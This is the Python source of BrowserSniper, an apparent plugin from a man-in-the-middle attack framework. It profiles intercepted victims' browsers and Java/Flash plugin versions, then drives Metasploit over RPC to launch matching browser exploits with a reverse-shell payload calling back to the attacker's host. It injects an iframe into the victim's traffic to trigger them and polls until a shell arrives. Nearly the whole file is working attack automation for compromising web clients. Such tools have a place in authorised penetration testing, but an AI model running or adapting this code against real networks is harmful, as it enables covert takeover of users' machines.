#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import string
import random
import threading
from time import sleep
from plugins.plugin import Plugin
from plugins.browserprofiler import BrowserProfiler

class BrowserSniper(BrowserProfiler, Plugin):
    name        = "BrowserSniper"
    optname     = "browsersniper"
    desc        = "Performs drive-by attacks on clients with out-of-date browser plugins"
    version     = "0.4"

    def initialize(self, options):
        self.options = options
        self.msfip   = options.ip
        self.sploited_ips = []  #store ip of pwned or not vulnerable clients so we don't re-exploit

        #Initialize the BrowserProfiler plugin
        BrowserProfiler.initialize(self, options)
        
        from core.msfrpc import Msf
        self.msf = Msf()
        self.tree_info.append("Connected to Metasploit v{}".format(self.msf.version))

        t = threading.Thread(name='sniper', target=self.snipe)
        t.setDaemon(True)
        t.start()

    def _setupExploit(self, exploit, msfport):

        self.log.debug('Setting up {}'.format(exploit))
        rand_url = "/" + ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, 5))
        rand_port = random.randint(1000, 65535)

        #generate the command string to send to the virtual console
        cmd = "use exploit/{}\n".format(exploit)
        cmd += "set SRVPORT {}\n".format(msfport)
        cmd += "set URIPATH {}\n".format(rand_url)
        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"
        cmd += "set LHOST {}\n".format(self.msfip)
        cmd += "set LPORT {}\n".format(rand_port)
        cmd += "set ExitOnSession False\n"
        cmd += "exploit -j\n"

        self.msf.sendcommand(cmd)

        return rand_url

    def _compat_system(self, os_config, brw_config, os, browser):

        if (os_config == 'any') and (brw_config == 'any'):
            return True

        if (os_config == 'any') and (brw_config in browser):
            return True

        if (os_config in os) and (brw_config == 'any'):
            return True

        if (os_config in os) and (brw_config in browser):
            return True

        return False

    def getExploits(self):
        exploits = []
        vic_ip = self.output['ip']
        os = self.output['ua_name']
        browser = self.output['os_name']
        java  = None
        flash = None

        if self.output['java'] is not None: 
            java = self.output['java']

        if self.output['flash'] is not None: 
            flash = self.output['flash']

        self.log.info("{} => OS: {} | Browser: {} | Java: {} | Flash: {}".format(vic_ip, os, browser, java, flash))

        for exploit, details in self.config['BrowserSniper']['exploits'].iteritems():

            if self._compat_system(details['OS'].lower(), details['Browser'].lower(), os.lower(), browser.lower()):

                if details['Type'].lower() == 'browservuln':
                    exploits.append(exploit)

                elif details['Type'].lower() == 'pluginvuln':

                    if details['Plugin'].lower() == 'java':
                        if (java is not None) and (java in details['PluginVersions']):
                            exploits.append(exploit)

                    elif details['Plugin'].lower() == 'flash':
                        
                        if (flash is not None) and (flash in details['PluginVersions']):
                            exploits.append(exploit)

        self.log.info("{} => Compatible exploits: {}".format(vic_ip, exploits))
        return exploits

    def injectAndPoll(self, ip, url):  #here we inject an iframe to trigger the exploit and check for resulting sessions
        
        #inject iframe
        self.log.info("{} => Now injecting iframe to trigger exploits".format(ip))
        self.html_url = url

        #The following will poll Metasploit every 2 seconds for new sessions for a maximum of 60 seconds 
        #Will also make sure the shell actually came from the box that we targeted
        self.log.info('{} => Waiting for ze shellz, sit back and relax...'.format(ip))

        poll_n = 1
        while poll_n != 30:

            if self.msf.sessionsfrompeer(ip):
                self.log.info("{} => Client haz been 0wn3d! Enjoy!".format(ip))
                self.sploited_ips.append(ip)
                self.black_ips = self.sploited_ips   #Add to inject plugin blacklist since box has been popped
                self.html_url = None
                return

            poll_n += 1
            sleep(2) 

        self.log.info("{} => Session not established after 60 seconds".format(ip))
        self.html_url = None

    def snipe(self):
        while True:
            if self.output:
                vic_ip = self.output['ip']

                if vic_ip not in self.sploited_ips:
                    msfport = self.config['BrowserSniper']['msfport']
                    exploits = self.getExploits()

                    if not exploits:
                            self.log.info('{} => Client not vulnerable to any exploits, adding to blacklist'.format(vic_ip))
                            self.sploited_ips.append(vic_ip)
                            self.black_ips = self.sploited_ips

                    elif exploits and (vic_ip not in self.sploited_ips):
                        self.log.info("{} => Client vulnerable to {} exploits".format(vic_ip, len(exploits)))

                        for exploit in exploits:

                            jobs = self.msf.findjobs(exploit)
                            if jobs:
                                self.log.info('{} => {} already started'.format(vic_ip, exploit))
                                url = self.msf.jobinfo(jobs[0])['uripath']  #get the url assigned to the exploit
                            else:
                                url = self._setupExploit(exploit, msfport)

                        iframe_url = 'http://{}:{}{}'.format(self.msfip, msfport, url)
                        self.injectAndPoll(vic_ip, iframe_url)

            sleep(1)
